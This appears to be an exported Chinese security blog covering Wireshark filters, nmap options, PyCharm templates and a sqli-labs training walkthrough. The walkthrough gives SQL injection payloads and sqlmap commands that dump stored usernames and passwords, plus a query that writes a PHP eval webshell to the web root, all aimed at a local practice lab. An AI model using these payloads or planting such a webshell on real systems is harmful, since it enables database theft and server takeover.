抓包嗅探协议分析，安全专家必备的技能，抓包引擎linux的libpcap,windows的winpcap,解码能力。 上图三部分依次是： 数据包的列表（info是wireshark的说明列，并不一定是数据包中的原始内容），分协议层，源数据（ascii） 基本使用方法捕获过滤器在捕获前设置软件即将捕获的数据包。 捕获过滤器表达式没有像显示过滤器表达式那样明显的规律，但写法不多所以也不难；而且除非全部捕获要占用的磁盘空间实现太大，且你非常明确过滤掉的数据包是你不需要的，不然一般都不用捕获过滤器表达式而用显示过滤器表达式。 捕获过滤器表达式语法： 1&lt;Protocol&gt; &lt;Direction&gt; &lt;Host(s)&gt; &lt;Value&gt; &lt;Logical Operations&gt; &lt;Other expression&gt; 说明： Protocol（协议）：ether，fddi， ip，arp，rarp，decnet，lat， sca，moprc，mopdl，tcp，udp 等，如果没指明协议类型，则默认为捕捉所有支持的协议。 Direction（方向）：src， dst，srt，src and dst， src or dst等，如果没指明方向，则默认使用 “src or dst” 作为关键字。 Host(s)：net, port, host, portrange等，默认使用”host”关键字，”src 10.1.1.1″与”src host 10.1.1.1″等价。 Logical Operations（逻辑运算）：not, and, or 等，否(“not”)具有最高的优先级。或(“or”)和与(“and”)具有相同的优先级，运算时从左至右进行。 常见捕获过滤器表达式1、捕获某主机的HTTP流量 123456host 192.168.5.231 and port 80 and http #只捕获主机192.168.5.231的http(80)流量port 80 and http #捕获所有经过该接口的http(80)流量。host 192.168.5.231 and not port 80 #捕获主机192.168.5.231除http(80)之外的其他所有流量not port 80 #捕获除http(80)之外的其他所有流量not port 80 and !http #捕获除http(80)之外的其他所有流量如果http被设置为8080，那么将80改为8080 2、 捕获某(些)主机的所有流量 1234host 192.168.5.231 #捕获源目主机均为192.168.5.231dst 192.168.5.231 #捕获目的主机均为192.168.5.231src 192.168.5.231 #捕获来源主机均为192.168.5.231net 192.168.5.0&#x2F;24 #捕获网段为192.168.5的所有主机的所有流量 3、捕获某主机的DNS流量 1234host 192.168.5.231 and port 53 # 只捕获主机192.168.5.231 的dns流量。src 192.168.5.231 and port 53 #只捕获主机192.168.5.231 对外的dns的流量。dst 192.168.5.231 and port 53 #只捕获dns服务器相应主机192.168.5.231的dns流量。port 53 #捕获接口中的所有主机的dns流量 4、只(不)捕获ARP流量 1234host 192.168.5.231 and arp#只捕获主机192.168.5.231 的arp流量。host 192.168.5.231 and !arp #只捕获主机192.168.5.231 除arp外的所有流量。arp #捕获接口中的所有arp请求!arp #捕获接口中所有非arpq请求。 5、只捕获特定端口的流量 12tcp portrange 8000-9000 an port 80 #捕获端口8000-9000之间和80端口的流量port 5060 #捕获sip流量，因为sip的默认端口是5060。举一反三：port 22 #捕获ssh流量 6、捕获电子邮件的流量 12host 192.168.5.231 and port 25 # 捕获主机192.168.5.231 的POP3协议的流量。port 25 and portrange 110-143 #因为电子邮件的协议：SMTP、POP3、IMAP4，所以捕获端口的流量。 7、捕获vlan 的流量 12vlan #捕获所有vlan的流量vlan and (host 192.168.5.0 and port 80) #捕获vlan 中主机192.168.5.0 ，前提是有vlan，在wifi中不一定可以捕获到相应的流量，局域网（公司，学校里面的网络应该有vlan) 8、捕获 PPPoE 流量 12pppoes #捕获所有的pppoes流量pppoes and (host 192.168.5.231 and port 80) #捕获主机 如果要捕获某种协议的流量，可以尝试捕获该端口的流量，请查看端口常识：https://svn.nmap.org/nmap/nmap-services 显示过滤器 管理显示过滤器： 显示过滤器表达式一条基本的表达式由过滤项、过滤关系、过滤值三项组成。比如ip.addr == 192.168.1.1，这条表达式中ip.addr是过滤项、==是过滤关系，192.168.1.1是过滤值（整条表达示的意思是找出所有ip协议中源或目标ip、等于、192.168.1.1的数据包） 1.过滤项wireshark的过滤项是 “协议” + “.” + “协议字段”。以端口为例，端口出现于tcp协议中所以有端口这个过滤项且其写法就是tcp.port。推广到其他协议，如eth、ip、udp、http、telnet、ftp、icmp、snmp等等其他协议都是这么个书写思路。当然wireshark出于缩减长度的原因有些字段没有使用协议规定的名称而是使用简写（比如Destination Port在wireshark中写为dstport）又出于简使用增加了一些协议中没有的字段（比如tcp协议只有源端口和目标端口字段，为了简便使用wireshark增加了tcp.port字段来同时代表这两个），但思路总的算是不变的。而且在实际使用时我们输入“协议”+“.”wireshark就会有支持的字段提示（特别是过滤表达式字段的首字母和wireshark在上边2窗口显示的字段名称首字母通常是一样的），看下名称就大概知道要用哪个字段了。wireshark支持的全部协议及协议字段可查看：https://www.wireshark.org/docs/dfref/ 2.过滤关系过滤关系就是大于、小于、等于等几种等式关系，我们可以直接看官方给出的表。注意其中有“English”和“C-like”两个字段，这个意思是说“English”和“C-like”这两种写法在wireshark中是等价的、都是可用的。 3.过滤值过滤值就是设定的过滤项应该满足过滤关系的标准，比如500、5000、50000等等。过滤值的写法一般已经被过滤项和过滤关系设定好了，只是填下自己的期望值就可以了。 复合过滤表达式所谓复合过滤表达示，就是指由多条基本过滤表达式组合而成的表达示。基本过滤表达式的写法还是不变的，复合过滤表达示多出来的东西就只是基本过滤表达示的“连接词” 我们依然直接参照官方给出的表，同样“English”和“C-like”这两个字段还是说明这两种写法在wireshark中是等价的、都是可用的。 常见用显示过滤需求及其对应表达式的示例数据链路层： 12eth.src &#x3D;&#x3D; 04:f9:38:ad:13:26 # 筛选源mac地址为04:f9:38:ad:13:26的数据包eth.dst &#x3D;&#x3D; 04:f9:38:ad:13:26 # 筛选目的mac地址为04:f9:38:ad:13:26的数据包 网络层： 123ip.addr &#x3D;&#x3D; 192.168.1.1 # 筛选ip地址为192.168.1.1的数据包ip.addr &#x3D;&#x3D; 192.168.1.1 &amp;&amp; ip.addr &#x3D;&#x3D; 192.168.1.2 # 筛选192.168.1.1和192.168.1.2之间的数据包ip.src &#x3D;&#x3D; 192.168.1.1 &amp;&amp; ip.dst &#x3D;&#x3D; 192.168.1.2 # 筛选从192.168.1.1到192.168.1.2的数据包 传输层： 12345tcp # 筛选tcp协议的数据包!tcp # 筛选除tcp协议以外的数据包tcp.port &#x3D;&#x3D; 80 # 筛选端口为80的数据包tcp.port &#x3D;&#x3D; 12345 &amp;&amp; tcp.port &#x3D;&#x3D; 80 # 筛选12345端口和80端口之间的数据包tcp.srcport &#x3D;&#x3D; 12345 &amp;&amp; tcp.dstport &#x3D;&#x3D; 80 # 筛选从12345端口到80端口的数据包 应用层： 123http中http.request表示请求头中的第一行（如GET index.jsp HTTP&#x2F;1.1），http.response表示响应头中的第一行（如HTTP&#x2F;1.1 200 OK），其他头部都用http.header_name形式。http.request.uri contains &quot;.php&quot; # 筛选url中包含.php的http数据包http contains &quot;username&quot; # 筛选内容包含username的http数据包 总结：为了安全考虑，wireshark只能查看封包，而不能修改封包的内容，或者发送封包。Wireshark能获取HTTP，也能获取HTTPS，但是不能解密HTTPS，所以wireshark看不懂HTTPS中的内容。如果是处理HTTP、HTTPS 还是建议大家用Fiddler, 其他协议比如TCP、UDP等等就可以直接使用Wireshark。","categories":[{"name":"工具","slug":"工具","permalink":"https://lacc233.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[]},{"title":"namp和zenmap详解","slug":"namp和zenmap详解","date":"2020-01-13T04:54:33.000Z","updated":"2020-08-18T12:06:08.124Z","comments":true,"path":"categories/工具/namp和zenmap详解/","link":"","permalink":"https://lacc233.github.io/categories/%E5%B7%A5%E5%85%B7/namp%E5%92%8Czenmap%E8%AF%A6%E8%A7%A3/","excerpt":"nmap是网络发现和安全审计工具，用来列举网络主机清单，管理服务升级调度，监控主机或服务运行状况。","text":"nmap是网络发现和安全审计工具，用来列举网络主机清单，管理服务升级调度，监控主机或服务运行状况。 https://blog.csdn.net/qq_36119192/article/details/82079150 用法探索主机是否在线12345678910-sn: Ping Scan 只进行主机发现，不进行端口扫描。-PE&#x2F;PP&#x2F;PM: 使用ICMP echo、 ICMP timestamp、ICMP netmask 请求包发现主机。-PS&#x2F;PA&#x2F;PU&#x2F;PY[portlist]: 使用TCP SYN&#x2F;TCP ACK或SCTP INIT&#x2F;ECHO方式进行发现。 -sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现。 -Pn: 将所有指定的主机视作开启的，跳过主机发现的过程。-PO[protocollist]: 使用IP协议包探测对方主机是否开启。 -n&#x2F;-R: -n表示不进行DNS解析；-R表示总是进行DNS解析。 --dns-servers &lt;serv1[,serv2],...&gt;: 指定DNS服务器。 --system-dns: 指定使用系统的DNS服务器 --traceroute: 追踪每个路由节点 探索公网IP1nmap -sn Nmap会发送四种不同类型的数据包来探测目标主机是否在线。 ICMP echo requesta TCP SYN packet to port 443(https)a TCP ACK packet to port 80(http)an ICMP timestamp request 例子1-A 全部参数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114Nmap 7.80（https:&#x2F;&#x2F;nmap.org）用法：nmap [扫描类型] [选项] &#123;目标规范&#125;目标规格： 可以传递主机名，IP地址，网络等。 例如：scanme.nmap.org，microsoft.com &#x2F; 24、192.168.0.1；10.0.0-255.1-254 -iL &lt;inputfilename&gt;：从文件中读取目标主机 -iR &lt;主机数量&gt;：选择随机目标 --exclude &lt;host1 [，host2] [，host3]，...&gt;：排除主机&#x2F;网络 --excludefile &lt;exclude_file&gt;：从文件中排除列表主机发现： -sL：列出扫描-仅列出要扫描的目标 -sn：Ping扫描-禁用端口扫描 -Pn：将所有主机视为联机-跳过主机发现 -PS &#x2F; PA &#x2F; PU &#x2F; PY [端口列表]：对给定端口的TCP SYN &#x2F; ACK，UDP或SCTP发现 -PE &#x2F; PP &#x2F; PM：ICMP回显，时间戳和网络掩码请求发现探针 -PO [协议列表]：IP协议Ping -n &#x2F; -R：从不进行DNS解析&#x2F;始终解析[默认值：有时] --dns-servers &lt;serv1 [，serv2]，...&gt;：指定自定义DNS服务器 --system-dns：使用操作系统的DNS解析器 --traceroute：跟踪到每个主机的跃点路径扫描技术： -sS &#x2F; sT &#x2F; sA &#x2F; sW &#x2F; sM：TCP SYN &#x2F; Connect（）&#x2F; ACK &#x2F; Window &#x2F; Maimon扫描 -sU：UDP扫描 -sN &#x2F; sF &#x2F; sX：TCP空，FIN和Xmas扫描 --scanflags &lt;标志&gt;：自定义TCP扫描标志 -sI &lt;僵尸主机[：probeport]&gt;：空闲扫描 -sY &#x2F; sZ：SCTP INIT &#x2F; COOKIE-ECHO扫描 -sO：IP协议扫描 -b &lt;FTP中继主机&gt;：FTP退回扫描端口规格和扫描顺序： -p &lt;端口范围&gt;：仅扫描指定的端口 例如：-p22; -p1-65535; -p U：53,111,137，T：21-25,80,139,8080，S：9 --exclude-ports &lt;端口范围&gt;：从扫描中排除指定端口 -F：快速模式-扫描的端口少于默认扫描 -r：连续扫描端口-不要随机化 --top-ports &lt;编号&gt;：扫描&lt;编号&gt;最常见的端口 --port-ratio &lt;比率&gt;：扫描端口比&lt;比率&gt;更常见服务&#x2F;版本检测： -sV：探测打开的端口以确定服务&#x2F;版本信息 --version-intensity &lt;级别&gt;：设置为0（浅）至9（尝试所有探针） --version-light：限制为最可能的探测（强度2） --version-all：尝试每个探针（强度9） --version-trace：显示详细的版本扫描活动（用于调试）脚本扫描： -sC：相当于--script &#x3D; default --script &#x3D; &lt;Lua脚本&gt;：&lt;Lua脚本&gt;是逗号分隔的列表 目录，脚本文件或脚本类别 --script-args &#x3D; &lt;n1 &#x3D; v1，[n2 &#x3D; v2，...]&gt;：提供脚本参数 --script-args-file &#x3D;文件名：在文件中提供NSE脚本args --script-trace：显示所有发送和接收的数据 --script-updatedb：更新脚本数据库。 --script-help &#x3D; &lt;Lua脚本&gt;：显示有关脚本的帮助。 &lt;Lua脚本&gt;是逗号分隔的脚本文件列表，或者 脚本类别。操作系统检测： -O：启用操作系统检测 --osscan-limit：将操作系统检测限制为有希望的目标 --osscan-guess：更积极地猜测操作系统时序和性能： 花费&lt;time&gt;的选项以秒为单位，或附加“ ms”（毫秒）， “ s”（秒），“ m”（分钟）或“ h”（小时）到值（例如30m）。 -T &lt;0-5&gt;：设置时序模板（越高越快） --min-hostgroup &#x2F; max-hostgroup &lt;大小&gt;：并行主机扫描组大小 --min-parallelism &#x2F; max-parallelism &lt;numprobes&gt;：探针并行化 --min-rtt-timeout &#x2F; max-rtt-timeout &#x2F; initial-rtt-timeout &lt;时间&gt;：指定 探测往返时间。 --max-retries &lt;tries&gt;：限制端口扫描探针重传的次数。 --host-timeout &lt;时间&gt;：在很长一段时间后放弃目标 --scan-delay &#x2F;-max-scan-delay &lt;时间&gt;：调整探头之间的延迟 --min-rate &lt;number&gt;：每秒发送数据包的速度不低于&lt;number&gt; --max-rate &lt;number&gt;：每秒发送数据包的速度不超过&lt;number&gt;防火墙&#x2F;标识闪避和疏散： -F; --mtu &lt;val&gt;：分段数据包（可选，带有给定的MTU） -D &lt;decoy1，decoy2 [，ME]，...&gt;：用诱饵掩盖扫描 -S &lt;IP地址&gt;：欺骗源地址 -e &lt;iface&gt;：使用指定的接口 -g &#x2F;-source-port &lt;端口号&gt;：使用给定的端口号 --proxies &lt;url1，[url2]，...&gt;：通过HTTP &#x2F; SOCKS4代理中继连接 --data &lt;十六进制字符串&gt;：将自定义有效负载附加到发送的数据包 --data-string &lt;字符串&gt;：将自定义ASCII字符串附加到发送的数据包 --data-length &lt;num&gt;：将随机数据附加到发送的数据包 --ip-options &lt;选项&gt;：发送具有指定ip选项的数据包 --ttl &lt;val&gt;：设置IP生存时间字段 --spoof-mac &lt;mac地址&#x2F;前缀&#x2F;供应商名称&gt;：欺骗您的MAC地址 --badsum：使用伪造的TCP &#x2F; UDP &#x2F; SCTP校验和发送数据包输出： -oN &#x2F; -oX &#x2F; -oS &#x2F; -oG &lt;文件&gt;：以普通，XML，s | &lt;rIpt kIddi3， 和Grepable格式分别更改为给定的文件名。 -oA &lt;basename&gt;：一次以三种主要格式输出 -v：提高详细程度（使用-vv或更高的效果更好） -d：提高调试级别（使用-dd或更多以获得更大的效果） --reason：显示端口处于特定状态的原因 --open：仅显示打开（或可能打开）的端口 --packet-trace：显示所有发送和接收的数据包 --iflist：打印主机接口和路由（用于调试） --append-output：追加而不是破坏指定的输出文件 --resume &lt;文件名&gt;：恢复中止的扫描 --stylesheet &lt;路径&#x2F; URL&gt;：XSL样式表，可将XML输出转换为HTML --webxml：Nmap.Org的参考样式表，用于更便携式的XML --no-stylesheet：防止关联带有XML输出的XSL样式表MISC： -6：启用IPv6扫描 -A：启用操作系统检测，版本检测，脚本扫描和跟踪路由 --datadir &lt;目录名&gt;：指定自定义Nmap数据文件位置 --send-eth &#x2F;-send-ip：使用原始以太网帧或IP数据包发送 --privileged：假设用户具有完全特权 --unprivileged：假设用户缺乏原始套接字特权 -V：打印版本号 -h：打印此帮助摘要页面。例子： nmap -v -A scanme.nmap.org nmap -v -sn 192.168.0.0&#x2F;16 10.0.0.0&#x2F;8 nmap -v -iR 10000 -Pn -p 80有关更多选项和示例，请参见手册页（https:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man.html）","categories":[{"name":"工具","slug":"工具","permalink":"https://lacc233.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[]},{"title":"pycharm配置","slug":"pycharm配置","date":"2019-11-09T03:30:22.000Z","updated":"2020-05-25T10:41:22.964Z","comments":true,"path":"categories/工具/pycharm配置/","link":"","permalink":"https://lacc233.github.io/categories/%E5%B7%A5%E5%85%B7/pycharm%E9%85%8D%E7%BD%AE/","excerpt":"pycharm配置","text":"pycharm配置 运行分配内存在pycharm安装目录下，bin/pycharm64.exe.vmoptions -Xms为最小内存，-Xmx为最大内存 安装插件file-&gt;settings-&gt;plugins,搜索后安装即可 自定义代码片段通用阶段 变量 描述 $end$ 表示光标中途停留的位置 $ITERABLE$ 表示光标初始停留的位置 $END$ 表示光标最后停留的位置（tab切换） $SELECTION$ 表示被选中的代码 $class$ 表示当前所在类名 $method$ 表示当前所在方法名 $NAME$ 名称位置标记（自定义），初始光标停留。一般多个$NAME$，用于同时命名。 $var$ 变量位置标记（自定义），初始光标停留。一般多个$var$，用于同时命名。 $var1$ 变量1，tab切换时，光标会在该处停留 $var2$ 变量2，tab切换时，光标会在该处停留 $var3$ 变量3，tab切换时，光标会在该处停留 0、新建.py文件模板： Setting-&gt;Editor-&gt;File and Code Templates-&gt;Files-&gt;Python Script进入代码片段编辑界面。 1234567# -*- coding: utf-8 -*-# Created by $USER on $DATEif __name__ == '__main__': pass 从File-&gt;Setting-&gt;Editor-&gt;Live Templates-&gt;Python进入代码片段编辑界面 1 、哈希加密：sha1 描述：sha1 encode hexdigest 1234567from hashlib import sha1s = sha1()s.update($password$.encode())$password$_sha1 = s.hexdigest() 提示：$password$的默认值单独设置为”password”。 2、处理异常：try 描述：try except finally 12345678try: $pass$except Exception as e: print(e)finally: $clo$ pass$END$ 提示：$pass$的默认值单独设置为”pass”；$clo的默认值设为”conn.close()” 3、处理异常：tee 描述：try… except… else 123456try: $SELECTION$$END$except Exception as e: print(e)else: pass 提示：$SELECTION$表示被选中的代码。 使用时，选中要放入try中的代码，再按ctrl+alt+T，选择tee。 4、处理异常：tef 描述：try… except… finally 1234567891011try: $SELECTION$$END$except Exception as e: print(e)finally: pass 提示：$SELECTION$表示被选中的代码。 使用时，选中要放入try中的代码，再按ctrl+alt+T，选择tef。 5、加双引号：str 描述：tostring 1\"$SELECTION$\" 提示：$SELECTION$表示被选中的代码。 使用时，选中要放入””双引号中的代码，再按ctrl+alt+T，选择str。 6、返回真：rt 描述：return Ture 1return True$END$ 7、返回假：rf 描述：return False 1return False$END$ 8、类：class 描述：class default 123456class $ClassName$(object): \"\"\"docstring for $ClassName$\"\"\" def __init__(self, arg): super($ClassName$, self).__init__() self.arg = arg$END$ django阶段8、渲染模板：reren 描述：return render() 123context&#x3D;&#123;$keyvalue$&#125;return render(request,&#39;$template$.html&#39;,context) 提示：顺序和初始值 $template$=”booktest/index”、 $keyvalue$ 9、准备数据：context 描述：context = {} 123456789101112131415context&#x3D;&#123; &#39;$uname$&#39;:$uname$, &#39;$upwd$&#39;:$upwd$, &#39;$var3$&#39;:$var3$, &#39;$var4$&#39;:$var4$, &#39;$var5$&#39;:$var5$, &#39;$var6$&#39;:$var6$,&#125; 提示：初始值 $uname$=”uname”、 $upwd$=”upwd” 10、准备数据：rehtt 描述：return HttpResponse() 1return HttpResponse(&quot;$ok$&quot;) 提示：初始值 $ok$=”ok” 11、准备数据：rejson 描述：return JsonResponse() 1return JsonResponse(&#123;&#39;$count$&#39;: $count$&#125;) 提示：初始值 $count$=”count”","categories":[{"name":"工具","slug":"工具","permalink":"https://lacc233.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[]},{"title":"sqli-labs靶场练习","slug":"sqli-labs靶场练习","date":"2019-10-13T03:20:03.000Z","updated":"2020-05-13T11:50:22.386Z","comments":true,"path":"categories/靶场/sqli-labs靶场练习/","link":"","permalink":"https://lacc233.github.io/categories/%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/","excerpt":"sql靶场","text":"sql靶场 准备 部署靶场过程参考：https://www.cnblogs.com/carlos-mm/p/8388351.html 靶场下载地址：https://github.com/Audi-1/sqli-labs 安装平台：windows 环境配置：phpstudy集成，注：php版本要7以下 ，因为sqli-labs是很多年前的了，那个时候的php版本是5 。 安装步骤：将下载的文件解压发在phpstudy的WWW文件夹下，修改 sqli-labs/sql-connections/db-creds.inc内的账号密码，打开sqli的网页，点击Setup/reset Database for labs安装。 1-35wp参考：https://blog.csdn.net/qq_41420747/article/details/81836327 page-1 order by 排序，数值时，某列；字符时，字段名；不存在该列时，报错。 union 合并多个select语句的结果集 concat()将两个或多个表达式加在一起。类似拼接字符串 rand()函数，随机0-1之间的数,floor(5+rand()*5)随机5到10 floor()去掉小数。floor(min + rand() * (max - min)) limit 检索（例 limit 1,5 检索1后面五个，也就是2-6） as 可理解为：用作、当成，作为；一般是重命名列名或者表名。（主要为了查询方便） group by 查询结果进行分组统计，最终得到一个分组汇总表(每个组各返回一个结果) left(被截取字符串， 截取长度) substr(string, start, length) Less-1get字符型报错注入 手工注入 1234567891011121314找注入点，id处存在注入点，修改id的值，页面发生改变。判断id的值类型?id&#x3D;2&#39;报错信息：...near &#39;&#39;2&#39;&#39; LIMIT 0,1&#39; at line 1，根据报错提示，判断出闭合条件为单引号，成功闭合?id&#x3D;2&#39; --+判断字段数为三个?id&#x3D;2&#39; order by 3 --+爆数据库名（[union操作符](https:&#x2F;&#x2F;www.runoob.com&#x2F;sql&#x2F;sql-union.html)）union 合并多个select语句的结果集，此处id&#x3D;0无结果，才会显示后面我们自己的结果。?id&#x3D;0&#39; union select 1,database(),version() --+爆表名?id&#x3D;0&#39; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() --+爆字段名，查看表单名，挑选其中的users?id&#x3D;0&#39; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot; and table_schema&#x3D;database() --+爆出字段值，根据爆出的字段名，挑选username和password?id&#x3D;0&#39; union select 1,database(),group_concat(username,0x3a,password) from security.users --+ sqlmap注入 1234sqlmap -u &quot;http:&#x2F;&#x2F;10.1.136.159&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --current-db --batchsqlmap -u &quot;http:&#x2F;&#x2F;10.1.136.159&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D &quot;security&quot; --tables --batchsqlmap -u &quot;http:&#x2F;&#x2F;10.1.136.159&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D &quot;security&quot; -T users --columns --batchsqlmap -u &quot;http:&#x2F;&#x2F;10.1.136.159&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D &quot;security&quot; -T users -C username,password --dump --batch Less-2get整形报错注入 12?id&#x3D;1&#39; #报错为：near &#39;&#39; LIMIT 0,1&#39; at line 1?id&#x3D;1 --+ #成功闭合 Less-3get字符型报错注入 12?id&#x3D;1&#39; #报错为：near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1?id&#x3D;1&#39;) --+ #成功闭合 Less-4get字符型报错注入 12?id&#x3D;1&quot; #报错为：near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1?id&#x3D;1&quot;) --+ #成功闭合 Less-5get字符型双注入 构造双查询，比如派生表，使一个报错，另一个的结果就会出现在报错的信息中。 手工注入 123456789101112131415爆库?id&#x3D;-1&#39;union select count(*),count(*), concat(&#39;~&#39;,(select database()),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+或者?id&#x3D;-1&#39;union select count(*),1, concat(&#39;~&#39;,(select database()),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+爆用户?id&#x3D;-1&#39; union select count(*),1, concat(&#39;~&#39;,(select user()),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a--+爆表名修改limit x,1 可以遍历表名，找到user这个表，猜测它存放username和password?id&#x3D;-1&#39; union select count(*),1, concat(&#39;~&#39;,(select concat(table_name) from information_schema.tables where table_schema&#x3D;database() limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+爆字段修改limit x,1 可以遍历列名，找到username和password列?id&#x3D;-1&#39; union select count(*),1, concat(&#39;~&#39;,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+爆值修改limit x,1 可以显示第x个用户的password和username （‘[’是分隔符）?id&#x3D;-1&#39; union select count(*),1, concat(&#39;~&#39;,(select concat_ws(&#39;[&#39;,password,username) from users limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+ sqlmap注入 12345678910111213141516python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.1.5:86&#x2F;Less-5&#x2F;?id&#x3D;1&quot; --current-db --dbms&#x3D;mysql --threads&#x3D;10 --batch结果---Parameter: id (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: id&#x3D;1&#39; AND 8616&#x3D;8616 AND &#39;IoWT&#39;&#x3D;&#39;IoWT Type: error-based Title: MySQL &gt;&#x3D; 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: id&#x3D;1&#39; AND (SELECT 1410 FROM(SELECT COUNT(*),CONCAT(0x71627a7171,(SELECT (ELT(1410&#x3D;1410,1))),0x7176787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &#39;Yobg&#39;&#x3D;&#39;Yobg Type: time-based blind Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP) Payload: id&#x3D;1&#39; AND (SELECT 5692 FROM (SELECT(SLEEP(5)))yEOF) AND &#39;SKCw&#39;&#x3D;&#39;SKCw--- Less-6get字符型双注入 如Less-5,这里单引号改为双引号闭合 Less-7get字符型导入导出文件注入 参考：https://www.jianshu.com/p/7b9256de20d1 读写条件 mysql中my.ini文件修改 secure_file_priv=&quot;&quot; 可导入 general_log = on 可写 路径 winserver的iis默认路径c:\\Inetpub\\wwwrootlinux的nginx一般是/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/htm等apache 就…/var/www/htm，…/var/www/html/htdocsphpstudy 就是…\\phpstudy_pro\\WWWxammp 就是…\\xampp\\htdocs 1?id&#x3D;1&#39;)) UNION SELECT 1,2,&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &quot;D:\\\\phpstudy_pro\\\\WWW\\\\1.php&quot; --+ 浏览器测试是否导入成功（直接查看 ） 若导入成功，菜刀连接 sqlmap注入 123456789101112python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.1.5:86&#x2F;Less-7&#x2F;?id&#x3D;1&quot; --batch --current-db --threads&#x3D;10结果---Parameter: id (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: id&#x3D;1&#39;) AND 2123&#x3D;2123 AND (&#39;klSO&#39;&#x3D;&#39;klSO Type: time-based blind Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP) Payload: id&#x3D;1&#39;) AND (SELECT 3973 FROM (SELECT(SLEEP(5)))otYf) AND (&#39;PIvC&#39;&#x3D;&#39;PIvC--- Less-8get字符型布尔盲注 手工注入 1234567891011121314单引号闭合?id&#x3D;1&#39; --+测试出库名的长度，同理测出表名长度，段名长度等?id&#x3D;1&#39; and length(database())&#x3D;8 --+测试出库名?id&#x3D;1&#39; and left((select database()),1)&#x3D;&#39;s&#39; --+?id&#x3D;1&#39; and left((select database()),8)&#x3D;&#39;security&#39; --+测试出表名?id&#x3D;1&#39; and left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1)&#x3D;&#39;r&#39; --+测试出段名?id&#x3D;1&#39; and left((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),8)&#x3D;&#39;password&#39; --+测试出password和username值?id&#x3D;1&#39; and left((select password from users order by id limit 0,1),1)&#x3D;&#39;a&#39; --+?id&#x3D;1&#39; and left((select username from users order by id limit 0,1),1)&#x3D;&#39;a&#39; --+ sqlmap注入 12暴库python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.1.5:86&#x2F;Less-8&#x2F;?id&#x3D;1&quot; --dbms&#x3D;mysql --technique&#x3D;B --threads&#x3D;10 --batch --current-db Less-9get字符型时间盲注 1234数据库长?id&#x3D;1&#39; and if (length(database())&#x3D;8,sleep(3),1)--+暴库名?id&#x3D;1&#39; and if(ascii(stustr(database(),1,1))&#x3D;115,1,sleep(3)) --+ Less-10get字符型时间盲注 手工注入 1234数据库长?id&#x3D;1&quot; and if (length(database())&#x3D;8,sleep(3),1)--+暴库名?id&#x3D;1&quot; and if(ascii(stustr(database(),1,1))&#x3D;115,1,sleep(3)) --+ sqlmap注入 1python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.1.5:86&#x2F;Less-10&#x2F;?id&#x3D;1&quot; --dbms&#x3D;mysql --technique&#x3D;T --threads&#x3D;10 --batch --current-db --level 2 --time-sec&#x3D;2 Less-11post字符型报错注入 手工注入 1234注入点uname&#x3D;123&#39; or 1&#x3D;1 %23 &amp;passwd&#x3D;123&amp;submit&#x3D;Submit数据库名uname&#x3D;123&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) %23 &amp;passwd&#x3D;123&amp;submit&#x3D;Submit Less-12post字符型报错注入 12爆库uname&#x3D;123&quot; and updatexml(1,concat(0x7e,database(),0x7e),1) and &quot;&amp;passwd&#x3D;123&amp;submit&#x3D;Submit Less-13post字符型双注入 12爆库uname&#x3D;123&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#39; &amp;passwd&#x3D;123&amp;submit&#x3D;Submit Less-14post字符型双注入 12爆库uname&#x3D;123&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &quot;&amp;passwd&#x3D;123&amp;submit&#x3D;Submit Less-15post字符型 时间/布尔 盲注 布尔盲注 1uname&#x3D;admin&#39;and length(database())&#x3D;8 %23 &amp;passwd&#x3D;123&amp;submit&#x3D;Submit 时间盲注 1uname&#x3D;admin&#39;and if(length(database())&#x3D;8,sleep(3),1) %23 &amp;passwd&#x3D;123&amp;submit&#x3D;Submit Less-16post字符型 时间/布尔 盲注 如less-15，这里”)闭合 Less-17post字符型 报错/更新查询 注入 uname需要是已存在的。 12345678暴库uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1,concat(0x7e,(database()),0x7e),1) 